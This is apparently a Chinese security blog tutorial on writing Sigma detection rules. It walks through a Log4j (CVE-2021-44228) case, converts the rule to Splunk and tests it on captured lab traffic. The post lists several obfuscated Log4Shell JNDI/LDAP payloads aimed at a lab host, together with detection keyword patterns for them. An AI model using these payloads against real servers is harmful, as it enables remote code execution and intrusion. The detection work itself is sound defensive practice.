# **写在前面**

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

##  **软件介绍**

Sigma是一种通用且开放的检测规则格式（SIEM
系统的通用签名格式），可让匹配描述相关的日志事件。规则格式非常灵活，易于编写且适用于任何类型的日志文件。该项目可以直接使用sigma格式进行威胁检测，也可以进行不同SIEM系统的格式转换。同时Sigma可以通过行为规则生成ATT&CK
Navigator热力图，直观看到行为模型的覆盖程度。

下载地址：

<https://github.com/SigmaHQ/sigma>

![1659231511_62e5dd17e748603140951.png!small?1659231512399](https://image.3001.net/images/20220731/1659231511_62e5dd17e748603140951.png!small?1659231512399)

##  **软件安装**

从github下载，该项目通过使用python运行，可根据需要安装第三方库。确保可以正常运行。

![1659231749_62e5de05ae911e7635eb5.png!small?1659231750513](https://image.3001.net/images/20220731/1659231749_62e5de05ae911e7635eb5.png!small?1659231750513)

##  **常用语法**

1.Sigma常用规则语法

Sigma规则支持不同应用的日志文件匹配，细分为Windows、Linux、，macos、cloud、web、proxy、network、apt等。可以根据具体的匹配日志进行详细规则输出。

![1659231775_62e5de1f49edf6b3080e0.png!small?1659231775841](https://image.3001.net/images/20220731/1659231775_62e5de1f49edf6b3080e0.png!small?1659231775841)

规则所需关键字使用时可以根据需求在官方网站查询。由于这部分内容较多，这里不在做过多的赘述。下面将举例说明（最基本的框架）：

https://www.loginsoft.com/blog/2020/06/17/threat-detection-with-sigma-rules/

![1659231801_62e5de3972624869b2675.png!small?1659231802035](https://image.3001.net/images/20220731/1659231801_62e5de3972624869b2675.png!small?1659231802035)  
 **0x04实战检测运用**

规则关键字及基础框架

  

title: 这是一个例子 （标题）

id: 5ea8faa8-db8b-45be-89b0-151b84c82702（编号）

status: 实验 （状态）

description: 这是一个例子 （描述）

author: yunzui （作者）

date: 2022/07/31 （日前）

modified: 2022/07/31

references: （参考）

-
tags: （对应的ATT&CK）

\- attack.initial_access

\- attack.t1190

logsource: （日志）

category: webserver

detection: （检测）

keywords: （匹配特征）

\- 'yunzui'

  

filter: （过滤）

\- 'mitian'

condition: keywords and not filter （命令逻辑）

falsepositives: （漏洞类型）

\- Vulnerability scanning

level: high （安全级别）

![1659231842_62e5de62deb1bffeffd54.png!small?1659231844444](https://image.3001.net/images/20220731/1659231842_62e5de62deb1bffeffd54.png!small?1659231844444)

日志检测（log4j漏洞利用为例）

 **1.通过分析log4j漏洞利用原理及攻击常见payload**

    
    
    ${jndi:ldap://10.211.55.2:8099/xobject}${jndi:ldap://127.0.0.1#10.211.55.2:8099/xobject}${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://10.211.55.2:8099/xobject}${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://10.211.55.2:8099/xobject}${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://10.211.55.2:8099/xobject}${${Lt::-j}${qAwQ:xz:-n}${j:j:-d}${PRX:jp:-i}:${r:M:-l}${::-d}${h:OjMc:-a}${OeR:iAob:-p}://10.211.55.2:8099/xobject}${${SFQv:jxfH:dhe:MNbb:n:-j}${hGS:w:N:-n}${:BAwG:A:QLo:-d}${mGFi:fjuO:::-i}:${:WhYw::-l}${X:ia::Pr:-d}${Bd:mrW:alo:-a}${N::-p}://10.211.55.2:8099/xobject}${${lower:${lower:j}}${lower:n}${lower:${lower:${lower:d}}}${lower:${lower:i}}:${lower:${lower:${lower:l}}}${lower:${lower:d}}${lower:${lower:${lower:a}}}${lower:${lower:${lower:${lower:p}}}}://10.211.55.2:8099/xobject}${${upper:${upper:${upper:${upper:j}}}}${upper:${upper:${upper:n}}}${upper:${upper:${upper:${upper:${upper:d}}}}}${upper:${upper:i}}:${upper:${upper:${upper:l}}}${upper:${upper:d}}${upper:${upper:${upper:${upper:${upper:a}}}}}${upper:p}://10.211.55.2:8099/xobject}${${upper:${upper:${upper:j}}}${lower:${lower:${lower:n}}}${lower:${upper:d}}${upper:${lower:i}}:${lower:${lower:${upper:${lower:l}}}}${lower:${lower:${upper:d}}}${upper:${lower:${upper:${lower:a}}}}${upper:${lower:p}}://10.211.55.2:8099/xobject}

 **2.提取检测特征**

漏洞分析复现，判断可能利用的姿势，提取检测特征，同时考虑上述bypass的payload,还有编码绕过等。

特征1 $

特征2 {}

特征3 jndi

特征4 ldap/ldaps/rmi/dns/iiop

特征5 lower

特征6 upper

 **3.通过在线漏洞环境进行测试，捕获攻击流量**

![1659231945_62e5dec9ca3d9d66510db.png!small?1659231948021](https://image.3001.net/images/20220731/1659231945_62e5dec9ca3d9d66510db.png!small?1659231948021)

漏洞测试（存在漏洞）

![1659232192_62e5dfc004069e25d05ff.png!small?1659232206053](https://image.3001.net/images/20220731/1659232192_62e5dfc004069e25d05ff.png!small?1659232206053)

捕获流量

![1659232227_62e5dfe3cadf0040b607c.png!small?1659232228177](https://image.3001.net/images/20220731/1659232227_62e5dfe3cadf0040b607c.png!small?1659232228177)

 **4.输出检测Sigma规则** **，有兴趣的可以深入研究，规则文件后缀为**.yml

    
    
    title: Log4j RCE CVE-2021-44228id: 5ea8faa8-db8b-45be-89b0-151b84c82731status: testdescription: Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 author: yunzuidate: 2022/07/31modified: 2022/12/06references:- https://www.lunasec.io/docs/blog/log4j-zero-day/- https://news.ycombinator.com/item?id=29504755tags:- attack.initial_access- attack.t1190logsource:category: webserverdetection:keywords:- '${jndi:ldap:/'- '${jndi:rmi:/'- '${jndi:ldaps:/'- '${jndi:dns:/'- '/$%7bjndi:'- '%24%7bjndi:'- '$%7Bjndi:'- '%2524%257Bjndi'- '%2F%252524%25257Bjndi%3A'- '${jndi:${lower:'- '${::-j}${'- '${jndi:nis'- '${jndi:nds'- '${jndi:corba'- '${jndi:iiop'- 'Reference Class Name: foo'- '${${env:BARFOO:-j}'- '${::-l}${::-d}${::-a}${::-p}'- '${base64:JHtqbmRp'- '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'- '${${lower:j}ndi:'- '${${upper:j}ndi:'- '${${::-j}${::-n}${::-d}${::-i}:'filter:- 'www.acunetix.com/acunetix'- '/acunetix}'condition: keywords and not filterfalsepositives:- Vulnerability scanninglevel: high

 **4.测试检测效果**

由于sigma是通过匹配日志进行威胁检测，这里需要将捕获的流量转化为日志。

1.通过sigma将规则转化为检测语法（这里以splunk为例）

![1659232347_62e5e05bc32214e308d84.png!small?1659232348303](https://image.3001.net/images/20220731/1659232347_62e5e05bc32214e308d84.png!small?1659232348303)

    
    
    python .\sigmac.py -t splunk -c ..\config\generic\windows-services.yml ..\..\rules\web\web_cve_2021_44228_log4j.yml

转化后的查询语句

    
    
    (("${jndi:ldap:/" OR "${jndi:rmi:/" OR "${jndi:ldaps:/" OR "${jndi:dns:/" OR "/$%7bjndi:" OR "%24%7bjndi:" OR "$%7Bjndi:" OR "%2524%257Bjndi" OR "%2F%252524%25257Bjndi%3A" OR "${jndi:${lower:" OR "${::-j}${" OR "${jndi:nis" OR "${jndi:nds" OR "${jndi:corba" OR "${jndi:iiop" OR "Reference Class Name: foo" OR "${${env:BARFOO:-j}" OR "${::-l}${::-d}${::-a}${::-p}" OR "${base64:JHtqbmRp" OR "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$" OR "${${lower:j}ndi:" OR "${${upper:j}ndi:" OR "${${::-j}${::-n}${::-d}${::-i}:") NOT ("www.acunetix.com/acunetix" OR "/acunetix}"))

2.安装splunk，将流量通过suricata引擎转化为log日志解析到splunk。

splunk安装

![1659232378_62e5e07a371c5712b6a2e.png!small?1659232379090](https://image.3001.net/images/20220731/1659232378_62e5e07a371c5712b6a2e.png!small?1659232379090)

suricata日志转化

![1659232397_62e5e08d1457f2e929c8f.png!small?1659232397915](https://image.3001.net/images/20220731/1659232397_62e5e08d1457f2e929c8f.png!small?1659232397915)

日志

![1659232412_62e5e09c4035afa1bee2e.png!small?1659232412574](https://image.3001.net/images/20220731/1659232412_62e5e09c4035afa1bee2e.png!small?1659232412574)

配置本地日志解析到splunk平台

数据输入

![1659232432_62e5e0b0d25a28996777f.png!small?1659232433154](https://image.3001.net/images/20220731/1659232432_62e5e0b0d25a28996777f.png!small?1659232433154)

选择日志文件

![1659232455_62e5e0c76c6ba0d423080.png!small?1659232455885](https://image.3001.net/images/20220731/1659232455_62e5e0c76c6ba0d423080.png!small?1659232455885)

日志成功解析到平台，执行搜索语法，匹配日志威胁特征，成功发现攻击行为。

![1659232477_62e5e0ddc8f722a62ef19.png!small?1659232478658](https://image.3001.net/images/20220731/1659232477_62e5e0ddc8f722a62ef19.png!small?1659232478658)

![1659232550_62e5e126270ef1c55658f.png!small?1659232550527](https://image.3001.net/images/20220731/1659232550_62e5e126270ef1c55658f.png!small?1659232550527)

查看匹配日志

![1659232520_62e5e108d9e0827615843.png!small?1659232521758](https://image.3001.net/images/20220731/1659232520_62e5e108d9e0827615843.png!small?1659232521758)

##  **总结思考**

日志分析作为安全运营中心（SOC）最重要的一个环节，针对日志的威胁检测尤为关键。同时以日志为数据源的安全产品层出不穷，其中
NGSOC目前最受欢迎。而Sigma目前作为优秀日志检测规则匹配，并结合ATT&CK攻击框架及杀伤链，可以大大提升了对威胁狩猎和攻击路径溯源的时间成本。

